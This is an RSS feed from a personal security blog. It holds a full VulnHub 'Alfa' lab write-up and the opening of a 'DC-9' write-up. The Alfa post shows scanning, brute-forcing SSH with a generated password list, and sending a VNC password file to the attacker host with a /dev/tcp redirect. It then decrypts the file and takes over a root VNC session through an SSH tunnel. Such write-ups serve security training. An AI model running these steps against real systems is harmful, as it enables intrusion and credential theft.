<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>VulnHub on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/writeups/vulnhub/</link>
    <description>Recent content in VulnHub on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 19 May 2021 01:32:22 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/writeups/vulnhub/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>VulnHub - Alfa</title>
      <link>https://fahmifj.github.io/writeups/vulnhub/vh-alfa/</link>
      <pubDate>Sun, 13 Jun 2021 16:55:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-alfa/</guid>
      <description>Do a simple OSINT to get shell access and VNC hijack</description>
      <content:encoded><![CDATA[<p>Alfa starts with enumeration on FTP to obtain a username and an image file, and the image file is named after the user&rsquo;s pet. Alfa&rsquo;s website has a robots.txt  file which contains an obfuscated web path to intranet chat support. The chat conversation reveals sensitive information, and with this, I&rsquo;m able to guess the user&rsquo;s password and gain a foothold on the system. In the user&rsquo;s home directory, there is a VNC password and it can be used to log into the currently running VNC server as root.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Generating password list</li>
<li>Brute-force FTP and SSH</li>
<li>VNC password decrypt</li>
<li>SSH tunneling</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Hydra</li>
<li>Crackmapexec</li>
<li>Gobuster</li>
<li>Brainfuck decoder - <a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></li>
<li>VNCviewer</li>
<li>pspy</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan with <code>nmap</code> discovers four open ports: FTP on port 21, HTTP on port 80, SMB on port 139 and 445.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nmap -sC -sV -oA nmap/10-initial-alfa 192.168.2.109 -v
<span class="c1"># Nmap 7.80 scan initiated Thu Apr 22 02:41:12 2021 as: nmap -sC -sV -oA nmap/10-initial-alfa -v 192.168.2.109</span>
Nmap scan report <span class="k">for</span> 192.168.2.109
Host is up <span class="o">(</span>0.00056s latency<span class="o">)</span>.
Not shown: <span class="m">996</span> closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
<span class="p">|</span>_drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Dec <span class="m">17</span> 13:02 thomas
<span class="p">|</span> ftp-syst: 
<span class="p">|</span>   STAT: 
<span class="p">|</span> FTP server status:
<span class="p">|</span>      Connected to ::ffff:192.168.2.103
<span class="p">|</span>      Logged in as ftp
<span class="p">|</span>      TYPE: ASCII
<span class="p">|</span>      No session bandwidth limit
<span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
<span class="p">|</span>      Control connection is plain text
<span class="p">|</span>      Data connections will be plain text
<span class="p">|</span>      At session startup, client count was <span class="m">3</span>
<span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
<span class="p">|</span>_End of status
80/tcp  open  http        Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: OPTIONS HEAD GET POST
<span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
<span class="p">|</span>_http-title: Alfa IT Solutions
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
MAC Address: 08:00:27:9C:8A:46 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Service Info: Host: ALFA<span class="p">;</span> OS: Unix

Host script results:
<span class="p">|</span>_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s
<span class="p">|</span> nbstat: NetBIOS name: ALFA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
<span class="p">|</span> Names:
<span class="p">|</span>   ALFA&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
<span class="p">|</span>   ALFA&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
<span class="p">|</span>   ALFA&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
<span class="p">|</span>   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
<span class="p">|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
<span class="p">|</span>   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
<span class="p">|</span>_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
<span class="p">|</span> smb-os-discovery: 
<span class="p">|</span>   OS: Windows 6.1 <span class="o">(</span>Samba 4.9.5-Debian<span class="o">)</span>
<span class="p">|</span>   Computer name: alfa
<span class="p">|</span>   NetBIOS computer name: ALFA<span class="se">\x</span><span class="m">00</span>
<span class="p">|</span>   Domain name: <span class="se">\x</span><span class="m">00</span>
<span class="p">|</span>   FQDN: alfa
<span class="p">|</span>_  System time: 2021-04-22T08:41:36+02:00
<span class="p">|</span> smb-security-mode: 
<span class="p">|</span>   account_used: guest
<span class="p">|</span>   authentication_level: user
<span class="p">|</span>   challenge_response: supported
<span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
<span class="p">|</span> smb2-security-mode: 
<span class="p">|</span>   2.02: 
<span class="p">|</span>_    Message signing enabled but not required
<span class="p">|</span> smb2-time: 
<span class="p">|</span>   date: 2021-04-22T06:41:36
<span class="p">|</span>_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Thu Apr 22 02:41:38 2021 -- 1 IP address (1 host up) scanned in 26.16 seconds</span>
</code></pre></div><p><code>nmap</code> identified anonymous access is allowed on FTP.</p>
<p>Performing a full port scan, discovers the fifth port.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nmap -p- nmap/10-allports-alfa 192.168.2.109 -v
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-22 02:53 EDT
Nmap scan report <span class="k">for</span> 192.168.2.109
Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
Not shown: <span class="m">65530</span> closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
65111/tcp open  unknown
MAC Address: 08:00:27:9C:8A:46 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 36.32 seconds
           Raw packets sent: <span class="m">65536</span> <span class="o">(</span>2.884MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">65536</span> <span class="o">(</span>2.621MB<span class="o">)</span>
</code></pre></div><p>Poking port 65111 with <code>nc</code> reveals it&rsquo;s SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nc 192.168.2.109 <span class="m">65111</span>
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
<p>Enumeration with on FTP discovers a potential username called <code>thomas</code>, an image file named <code>milo.jpg</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ ftp 192.168.2.109 
Connected to 192.168.2.109.
<span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>192.168.2.109:root<span class="o">)</span>: anonymous
<span class="m">331</span> Please specify the password.
Password:
<span class="m">230</span> Login successful.
Remote system <span class="nb">type</span> is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Dec <span class="m">17</span> 13:02 thomas
<span class="m">226</span> Directory send OK.
ftp&gt; <span class="nb">cd</span> thomas
<span class="m">250</span> Directory successfully changed.
ftp&gt; dir
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Here comes the directory listing.
-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>          <span class="m">104068</span> Dec <span class="m">17</span> 12:49 milo.jpg
</code></pre></div><p><code>milo.jpg</code> is a picture of a dog.</p>
<p><div class="img-container"><img src="imgs/image-20210613181756997.png" alt="image-20210613181756997"  /></div>
</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous access is allowed but no read permission there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ crackmapexec smb 192.168.2.109 -u <span class="s1">&#39;ANONYMOUS&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
SMB         192.168.2.109   <span class="m">445</span>    ALFA             <span class="o">[</span>*<span class="o">]</span> Windows 6.1 <span class="o">(</span>name:ALFA<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         192.168.2.109   <span class="m">445</span>    ALFA             <span class="o">[</span>+<span class="o">]</span> <span class="se">\A</span>NONYMOUS: 
SMB         192.168.2.109   <span class="m">445</span>    ALFA             <span class="o">[</span>+<span class="o">]</span> Enumerated shares
SMB         192.168.2.109   <span class="m">445</span>    ALFA             Share           Permissions     Remark
SMB         192.168.2.109   <span class="m">445</span>    ALFA             -----           -----------     ------
SMB         192.168.2.109   <span class="m">445</span>    ALFA             print$                          Printer Drivers
SMB         192.168.2.109   <span class="m">445</span>    ALFA             IPC$                            IPC Service <span class="o">(</span>Samba 4.9.5-Debian<span class="o">)</span>
</code></pre></div><h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Visiting port 80 shows a website titled with &ldquo;Alfa IT Solutions&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422143723577.png" alt="image-20210422143723577"  /></div>
</p>
<p>Nothing useful on the page source.</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a <code>robot.txt</code> file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ gobuster dir -u http://192.168.2.109/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster/gobuster-L-80 
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://192.168.2.109/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              html,txt,bak
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/04/22 02:46:48 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/js/<span class="o">]</span>
/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/images/<span class="o">]</span>
/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/css/<span class="o">]</span>   
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3870<span class="o">]</span>                                  
/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/fonts/<span class="o">]</span> 
/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 459<span class="o">]</span>                                   
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span> 
</code></pre></div><h4 id="robotstxt">robots.txt</h4>
<p>Accessing <code>robots.txt</code> discovers some directories. But, these are just dummy.</p>
<p><div class="img-container"><img src="imgs/image-20210422134810181.png" alt="image-20210422134810181"  /></div>
</p>
<p>Poking the <code>robots.txt</code> file with <code>curl</code> discovers a string which looks like a brainfuck language.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ curl -s http://192.168.2.109/robots.txt
/home <span class="c1">#404</span>
/admin <span class="c1">#404</span>
/login <span class="c1">#404</span>
/images <span class="c1">#200, directory listing, nothing interesting</span>
/cgi-bin <span class="c1">#404</span>
/intranet <span class="c1">#404</span>
/wp-admin <span class="c1">#404</span>
/wp-login <span class="c1">#404</span>

...&lt;SNIP&gt;...
++++++++++<span class="o">[</span>&gt;+&gt;+++&gt;+++++++&gt;++++++++++<span class="o">&lt;&lt;&lt;</span>&lt;-<span class="o">]</span>&gt;&gt;+++++++++++++++++.&gt;&gt;---.+++++++++++.------.-----.&lt;&lt;--.&gt;&gt;++++++++++++++++++.++.-----..-.+++.++.
</code></pre></div><p>Using <a href="https://www.dcode.fr/brainfuck-language">this site</a>, the string gets translated as <code>/alfa-support</code> .</p>
<p><div class="img-container"><img src="imgs/image-20210613181246585.png" alt="image-20210613181246585"  /></div>
</p>
<h4 id="alfa-support">/alfa-support</h4>
<p>On <code>/alfa-support</code>, there is a chat between Thomas as the employee and the IT support operator (I think?).</p>
<p><div class="img-container"><img src="imgs/image-20210422143814423.png" alt="image-20210422143814423"  /></div>
</p>
<p>From the conversation above, I&rsquo;ll note that Thomas uses a password that consists of his(or her?) pet&rsquo;s name followed by 3 numerical digits.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-thomas">Shell as Thomas</h3>
<h4 id="creating-wordlist">Creating Wordlist</h4>
<p>From the previous FTP enumeration, &lsquo;milo&rsquo; is most likely the name of Thomas&rsquo;s pet.  With <code>bash</code>, I could generate all the possible password used by Thomas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ <span class="k">for</span> i in <span class="o">{</span>000..999<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&#34;milo</span><span class="nv">$i</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">done</span> <span class="p">|</span> tee passwords
milo000
milo001
milo002
milo003
...&lt;snip&gt;...
</code></pre></div><h4 id="brute-force---ftp">Brute force - FTP</h4>
<p>I tried it with Hydra on FTP but returns nothing.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"> root@iamf «alfa» «192.168.2.103» 
$ hydra -l thomas -P passwords ftp://192.168.2.103 
Hydra v9.0 <span class="o">(</span>c<span class="o">)</span> <span class="m">2019</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-04-22 03:43:09
<span class="o">[</span>WARNING<span class="o">]</span> Restorefile <span class="o">(</span>you have <span class="m">10</span> seconds to abort... <span class="o">(</span>use option -I to skip waiting<span class="o">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
<span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">1000</span> login tries <span class="o">(</span>l:1/p:1000<span class="o">)</span>, ~63 tries per task
<span class="o">[</span>DATA<span class="o">]</span> attacking ftp://192.168.2.103:21/
<span class="o">[</span>STATUS<span class="o">]</span> 320.00 tries/min, <span class="m">320</span> tries in 00:01h, <span class="m">713</span> to <span class="k">do</span> in 00:03h, <span class="m">16</span> active
<span class="o">[</span>STATUS<span class="o">]</span> 317.00 tries/min, <span class="m">634</span> tries in 00:02h, <span class="m">399</span> to <span class="k">do</span> in 00:02h, <span class="m">16</span> active
<span class="o">[</span>STATUS<span class="o">]</span> 315.67 tries/min, <span class="m">947</span> tries in 00:03h, <span class="m">86</span> to <span class="k">do</span> in 00:01h, <span class="m">16</span> active
<span class="m">1</span> of <span class="m">1</span> target completed, <span class="m">0</span> valid passwords found
<span class="o">[</span>WARNING<span class="o">]</span> Writing restore file because <span class="m">15</span> final worker threads did not <span class="nb">complete</span> <span class="k">until</span> end.
<span class="o">[</span>ERROR<span class="o">]</span> <span class="m">15</span> targets did not resolve or could not be connected
<span class="o">[</span>ERROR<span class="o">]</span> <span class="m">0</span> targets did not <span class="nb">complete</span>
Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-04-22 03:46:35
</code></pre></div><h4 id="brute-force---ssh">Brute force - SSH</h4>
<p>This time, I divided the wordlist into two files.</p>
<ul>
<li>passwords1: 000-500</li>
<li>passwords2: 500-999</li>
</ul>
<p>And I&rsquo;ll use <code>crackmapexec</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «alfa» «192.168.2.103» 
$ crackmapexec ssh 192.168.2.109 -u thomas -p passwords2 --port <span class="m">65111</span>
</code></pre></div><p>After some minutes it returns one valid combination: <code>thomas:milo666</code></p>
<p><div class="img-container"><img src="imgs/image-20210422151432013.png" alt="image-20210422151432013"  /></div>
</p>
<h4 id="ssh---thomas">SSH - Thomas</h4>
<p>I&rsquo;ll just log in via SSH and grabs the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ ssh -p <span class="m">65111</span> thomas@192.168.2.109
thomas@192.168.2.109<span class="err">&#39;</span>s password: 
Linux Alfa 4.19.0-13-amd64 <span class="c1">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>

<span class="c1">####################################################################</span>
<span class="c1">#                  ,---------------------------,                   #</span>
<span class="c1">#                  |  /---------------------\  |                   #</span>
<span class="c1">#                  | |                       | |                   #</span>
<span class="c1">#                  | |         +----+        | |                   #</span>
<span class="c1">#                  | |         |ALFA|        | |                   #</span>
<span class="c1">#                  | |         +----+        | |                   #</span>
<span class="c1">#                  | |                       | |                   #</span>
<span class="c1">#                  |  \_____________________/  |                   #</span>
<span class="c1">#                  |___________________________|                   #</span>
<span class="c1">#                ,---\_____     []     _______/------,             #</span>
<span class="c1">#              /         /______________\           /|             #</span>
<span class="c1">#            /___________________________________ /  | ___         #</span>
<span class="c1">#            |                                   |   |    )        #</span>
<span class="c1">#            |  _ _ _                 [-------]  |   |   (         #</span>
<span class="c1">#            |  o o o                 [-------]  |  /    _)_       #</span>
<span class="c1">#            |__________________________________ |/     /  /       #</span>
<span class="c1">#        /-------------------------------------/|      ( )/        #</span>
<span class="c1">#      /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                   #</span>
<span class="c1">#    /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                     #</span>
<span class="c1">#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       #</span>
<span class="c1">#  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗  #</span>
<span class="c1">#  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝  #</span>
<span class="c1">#  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗    #</span>
<span class="c1">#  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝    #</span>
<span class="c1">#  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  #</span>
<span class="c1">#   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  #</span>
<span class="c1">####################################################################</span>

thomas@Alfa:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>thomas<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>thomas<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>1000<span class="o">(</span>thomas<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
thomas@Alfa:~$ ls -l
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> thomas thomas <span class="m">1332</span> dic <span class="m">20</span> 11:04 user.txt
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal enumeration</h4>
<p>In thomas&rsquo;s home directory,  there is a file called <code>.remote-secret</code> and it is owned by root but world-writable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ ls -la
total <span class="m">40</span>
drwxr-xr-x <span class="m">4</span> thomas thomas <span class="m">4096</span> dic <span class="m">20</span> 22:22 .
drwxr-xr-x <span class="m">3</span> root   root   <span class="m">4096</span> dic <span class="m">16</span> 07:58 ..
-rw------- <span class="m">1</span> thomas thomas    <span class="m">4</span> dic <span class="m">20</span> 22:22 .bash_history
-rw-r--r-- <span class="m">1</span> thomas thomas  <span class="m">220</span> dic <span class="m">16</span> 07:58 .bash_logout
-rw-r--r-- <span class="m">1</span> thomas thomas <span class="m">3526</span> dic <span class="m">16</span> 07:58 .bashrc
drwx------ <span class="m">3</span> thomas thomas <span class="m">4096</span> dic <span class="m">16</span> 21:15 .gnupg
drwxr-xr-x <span class="m">3</span> thomas thomas <span class="m">4096</span> dic <span class="m">16</span> 20:44 .local
-rw-r--r-- <span class="m">1</span> thomas thomas  <span class="m">807</span> dic <span class="m">16</span> 07:58 .profile
-rwxrwxrwx <span class="m">1</span> root   root     <span class="m">16</span> dic <span class="m">17</span> 23:35 .remote_secret
-rw-r--r-- <span class="m">1</span> thomas thomas <span class="m">1332</span> dic <span class="m">20</span> 11:04 user.txt
</code></pre></div><p>At first, I assumed it was some kind of service hijacking, but the file contents appeared to be encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ cat .remote_secret 
�<span class="s2">&#34;�Cc�&#34;</span>�Cc
</code></pre></div><p>Running <a href="https://github.com/DominicBreuker/pspy">pspy</a> discovers a VNC server running locally with root access on port 5901.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">2021/04/22 10:47:57 CMD: UID=0    PID=404    | /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth    
</code></pre></div><h4 id="vnc-decrypt">VNC Decrypt</h4>
<p>This <code>.remote_secret</code> is a VNC password file and I could use <a href="https://github.com/jeroennijhof/vncpwd">vncpwd</a> to decrypt it (I&rsquo;ve also done this previously on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-cascade/#decrypt-vnc-password">HTB: Cascade</a>). I&rsquo;ll transfer the file to my attacking machine and decrypt it there.</p>
<p>On Alfa:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ cat .remote_secret &gt; /dev/tcp/192.168.2.103/9000
</code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nc -nvlp <span class="m">9000</span> &gt; remote_secret
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>192.168.2.103<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.2.109<span class="o">]</span> <span class="m">57532</span>
</code></pre></div><p>The file content is decrypted to <code>k!LL3rSs</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ ./vncpwd remote_secret 
Password: k!LL3rSs
</code></pre></div><p>I tried the password on root, but it didn&rsquo;t work. The next option here is to access the VNC server using this password.</p>
<h4 id="accessing-vnc">Accessing VNC</h4>
<p>Since the VNC server is not accessible from outside, I&rsquo;ll need a port forwarding to interact with it.</p>
<p>On thomas&rsquo;s session</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ ~C
ssh&gt; -L 5901:localhost:5901 
Forwarding port.
</code></pre></div><p>That will create a tunnel from my Kali localhost:5901 =&gt; Alfa&rsquo;s localhost:5901</p>
<p>Now I can try to connect to the VNC server using <code>vncviewer</code> (it&rsquo;s preinstalled on Kali) and provide <code>remote_secret</code> as the password file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103»  
$ vncviewer -passwd remote_secret 127.0.0.1:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Authentication successful
Desktop name <span class="s2">&#34;Alfa:1 (root)&#34;</span>
VNC server default format:
  <span class="m">32</span> bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red <span class="m">255</span> green <span class="m">255</span> blue 255, <span class="nb">shift</span> red <span class="m">16</span> green <span class="m">8</span> blue <span class="m">0</span>
Using default colormap which is TrueColor.  Pixel format:
  <span class="m">32</span> bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red <span class="m">255</span> green <span class="m">255</span> blue 255, <span class="nb">shift</span> red <span class="m">16</span> green <span class="m">8</span> blue <span class="m">0</span>
Same machine: preferring raw encoding
</code></pre></div><p>It opens this Windows, and I&rsquo;m already on root.</p>
<p><div class="img-container"><img src="imgs/image-20210422160633799.png" alt="image-20210422160633799"  /></div>
</p>
<p>To be honest, this is actually guessing.</p>
<p>At first I doubt that this remote_secret is shared with root user, but that&rsquo;s how I pwned this machine.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc">https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>VulnHub - DC-9</title>
      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</link>
      <pubDate>Wed, 02 Jun 2021 01:18:59 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</guid>
      <description>DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by leveraging the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.
Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.</description>
      <content:encoded><![CDATA[<p>DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by leveraging the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.</p>
<p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule. Even though I gained a foothold by skipping the LFI and port knocking, I&rsquo;ll still include the intended way (LFI and port knocking) in the foothold section.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Blind SQL injection</li>
<li>Local file Inclusion</li>
<li>Port knocking</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Arpscan</li>
